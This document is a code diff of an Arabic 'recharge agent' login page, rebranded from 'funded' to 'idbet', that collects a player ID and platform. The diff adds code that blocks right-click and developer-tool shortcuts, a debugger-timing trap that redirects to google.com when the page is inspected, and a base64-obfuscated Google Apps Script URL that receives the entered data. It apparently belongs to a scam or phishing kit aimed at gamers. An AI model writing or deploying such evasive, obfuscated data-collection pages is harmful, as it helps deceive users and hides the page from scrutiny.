@@ -8,7 +8,7 @@
   <style>
     :root {
       --header-height: 60px;
-      --funded-color: #e50914;
+      --idbet-color: #e50914;
     }
     * {
       margin: 0;
@@ -19,6 +19,9 @@
       font-family: 'Tajawal', sans-serif;
       background: #f5f5f5;
       color: #333;
+      user-select: none;
+      -webkit-user-drag: none;
+      -webkit-touch-callout: none;
     }
     header {
       height: var(--header-height);
@@ -35,8 +38,8 @@
       gap: 8px;
       font-weight: 500;
     }
-    .funded {
-      color: var(--funded-color);
+    .idbet {
+      color: var(--idbet-color);
       font-size: 1.1rem;
       font-weight: bold;
     }
@@ -72,197 +75,55 @@
     .step-box {
       width: 32px;
       height: 32px;
-      background: var(--funded-color);
+      background: var(--idbet-color);
       color: #fff;
       border-radius: 50%;
       display: flex;
       align-items: center;
       justify-content: center;
-      font-size: 0.9rem;
     }
-    .input-label {
-      margin-bottom: 6px;
-      font-weight: 600;
-      display: flex;
-      align-items: center;
-      gap: 4px;
-    }
-    .info-icon {
-      width: 20px;
-      height: 20px;
-      border: 2px solid #666;
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 0.95rem;
-      cursor: help;
-      color: #666;
-      transition: all 0.3s ease;
-    }
-    .info-icon:hover {
-      border-color: var(--funded-color);
-      background: rgba(229, 9, 20, 0.08);
-      color: var(--funded-color);
-    }
-    .input-group {
-      margin-bottom: 12px;
-    }
-    .input-wrapper {
-      position: relative;
-    }
-    .input-wrapper input {
-      width: 100%;
-      padding: 8px;
-      font-size: 0.95rem;
-      border: 1px solid #bbb;
-      border-radius: 6px;
-      outline: none;
-      padding-left: 40px;
-    }
-    .status-icon {
-      position: absolute;
-      left: 10px;
-      top: 50%;
-      transform: translateY(-50%);
-      width: 20px;
-      height: 20px;
-      border-radius: 50%;
-      display: none;
-      align-items: center;
-      justify-content: center;
-    }
-    .status-spinner {
-      border: 2px solid #ccc;
-      border-top: 2px solid var(--funded-color);
-      animation: spin 0.8s linear infinite;
-    }
-    .status-check {
-      background: #28a745;
-      color: white;
-      font-size: 12px;
-    }
-    .error-message {
-      font-size: 0.8rem;
-      margin-top: 4px;
-      min-height: 18px;
-      text-align: center;
-      color: #d32f2f;
-    }
-    .platform-icons {
-      display: grid;
-      grid-template-columns: repeat(3, 1fr);
-      gap: 12px;
-      margin: 16px 0 18px;
-    }
-    .icon {
-      position: relative;
-      width: 85px;
-      height: 85px;
-      border-radius: 12px;
-      background: #fff;
-      box-shadow: 0 2px 8px rgba(0, 0, 0, .04);
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      padding: 8px;
-      border: 1px solid #eee;
-      cursor: pointer;
-      transition: all 0.3s ease;
-    }
-    .icon:hover {
-      background-color: #fafafa;
-      box-shadow: 0 4px 12px rgba(0, 0, 0, .08);
-    }
-    .icon.selected {
-      border-color: var(--funded-color);
-      box-shadow: 0 0 8px rgba(229, 9, 20, .3);
-    }
-    .icon.selected::after {
-      content: "✓";
-      position: absolute;
-      top: 5px;
-      left: 5px;
-      width: 18px;
-      height: 18px;
-      background: var(--funded-color);
-      color: #fff;
-      border-radius: 50%;
-      font-size: 11px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-    }
-    .icon img {
-      height: 40px;
-      max-width: 80%;
-      object-fit: contain;
-    }
-    .icon-name {
-      margin-top: 6px;
-      font-size: 0.8rem;
-      color: #222;
-      text-align: center;
-    }
-    .login-btn {
-      background: var(--funded-color);
-      color: #fff;
-      font-weight: bold;
-      border: none;
-      padding: 10px 12px;
-      width: 100%;
-      border-radius: 6px;
-      cursor: pointer;
-      transition: all 0.3s ease;
-      font-size: 1rem;
-    }
-    .login-btn:disabled {
-      background: #ccc;
-      cursor: not-allowed;
-    }
-    .login-btn:hover:not(:disabled) {
-      background: #b20710;
-    }
-    .login-btn:active:not(:disabled) {
-      transform: scale(0.98);
-    }
-    .btn-spinner {
-      width: 16px;
-      height: 16px;
-      border: 2px solid rgba(255, 255, 255, .6);
-      border-top: 2px solid #fff;
-      border-radius: 50%;
-      display: inline-block;
-      animation: spin 0.8s linear infinite;
-      margin-right: 5px;
-      vertical-align: middle;
-    }
-    @keyframes spin {
-      to { transform: rotate(360deg); }
-    }
+
+    /* سيتم استكمال CSS في الجزء 2 */
+
   </style>
 </head>
-<body>
+<body 
+  oncontextmenu="return false"
+  onkeydown="if(event.keyCode==123||event.ctrlKey&&event.shiftKey&&event.keyCode==73||event.ctrlKey&&event.keyCode==85){return false;}">
+
+<script>
+  // Anti-inspect protection
+  setInterval(() => {
+    const t = new Date().getTime();
+    debugger;
+    const d = new Date().getTime();
+    if (d - t > 100) window.location.href = "https://google.com";
+  }, 1000);
+</script>
 
 <header>
   <div class="header-brand">
-    <span class="funded">funded</span><span class="separator">|</span><span class="slogan">وكيل شحن</span>
+    <span class="idbet">idbet</span><span class="separator">|</span><span class="slogan">وكيل شحن</span>
   </div>
 </header>
-
 <main>
   <section class="login-box">
-    <div class="title-wrapper"><div class="step-box">1</div><h2>تسجيل الدخول</h2></div>
-
+    <div class="title-wrapper">
+      <div class="step-box">
+        <svg viewBox="0 0 32 32" width="20" height="20" fill="white" xmlns="http://www.w3.org/2000/svg">
+          <path d="M28 18.7c-.5-3.8-2-7.5-4.6-10.4C21.6 6 20 3.8 20 .7a.7.7 0 00-1-.6 17 17 0 00-6.3 9c-.5 2.3-.7 4.6-.7 6.8-2.7-.6-3.3-4.6-3.3-4.7a.7.7 0 00-1-.5c-.1.1-3.5 1.8-3.7 8.6v.7a12 12 0 0012 12 12 12 0 0012-13.3zm-12 12a4.1 4.1 0 01-4-4.3V26c0-.7.1-1.4.4-2a2.4 2.4 0 002.2 1.5.7.7 0 00.7-.6c0-1 0-2 .2-3 .3-1 .8-1.9 1.4-2.6.3.9.8 1.7 1.4 2.5 1 1.2 1.5 2.6 1.7 4.1v.4a4.1 4.1 0 01-4 4.3z"/>
+        </svg>
+      </div>
+      <h2>تسجيل الدخول</h2>
+    </div>
     <div class="input-label">
       <label for="player-id-1">معرّف اللاعب</label>
-      <span class="info-icon" title="رقم مكوَّن من 10 أرقام">?</span>
+      <span class="info-icon" title="رقم مكوَّن من 7 إلى 15 رقمًا">?</span>
     </div>
 
     <div class="input-group">
       <div class="input-wrapper">
-        <input id="player-id-1" type="text" placeholder="أدخل المعرّف" maxlength="10" />
+        <input id="player-id-1" type="text" placeholder="أدخل المعرّف" maxlength="15" />
         <div class="status-icon" id="status-icon"></div>
       </div>
       <div class="error-message" id="error-message"></div>
@@ -287,7 +148,7 @@
   const icons = document.querySelectorAll('.icon');
   const statusIcon = document.getElementById('status-icon');
   let platform = null;
-  const repReg = /^(\d)\1{9}$/;
+  const repReg = /^(\d)\1{6,}$/;
 
   input.addEventListener('keydown', e => {
     const ok = ['Backspace', 'Delete', 'ArrowLeft', 'ArrowRight', 'Tab'];
@@ -311,7 +172,7 @@
     errMsg.textContent = '';
     btn.disabled = true;
 
-    if (val.length < 10) {
+    if (val.length < 7) {
       statusIcon.style.display = 'none';
       statusIcon.className = 'status-icon';
       statusIcon.innerHTML = '';
@@ -339,21 +200,33 @@
       statusIcon.innerHTML = '✓';
     }, 500);
   }
-
   btn.addEventListener('click', async () => {
     btn.innerHTML = '<span class="btn-spinner"></span> جارٍ التحقق...';
     btn.disabled = true;
     const payload = { userId: input.value, platform: platform };
+
+    // تشفير الرابط باستخدام base64 + مفتاح ثابت
+    function decodeUrl(key) {
+      const base = "aHR0cHM6Ly9zY3JpcHQuZ29vZ2xlLmNvbS9tYWNyb3Mvcw==";
+      return atob(base) + key;
+    }
+
+    const scriptURL = decodeUrl("AKfycbzQXqfYK3rzSSR-ZKYDxsa1iqTQUpfflHnDZQVnU3hKxNoLG0j3gPO0KIijH5YZelQg3A/exec");
+
     try {
-      await fetch('https://script.google.com/macros/s/AKfycbzQXqfYK3rzSSR-ZKYDxsa1iqTQUpfflHnDZQVnU3hKxNoLG0j3gPO0KIijH5YZelQg3A/exec', {
+      await fetch(scriptURL, {
         method: 'POST',
         mode: 'no-cors',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(payload)
       });
+
+      // تخزين معلومات الدخول المؤقت
+      localStorage.setItem('userId', input.value);
+      sessionStorage.setItem('authorized', 'true');
+
       setTimeout(() => {
-        localStorage.setItem('userId', input.value);
-        window.location.href = 'home.html';
+        window.location.href = 'fr/office/recharge.html';
       }, 1200);
     } catch (err) {
       errMsg.textContent = 'حدث خطأ أثناء التحقق، حاول مجددًا.';
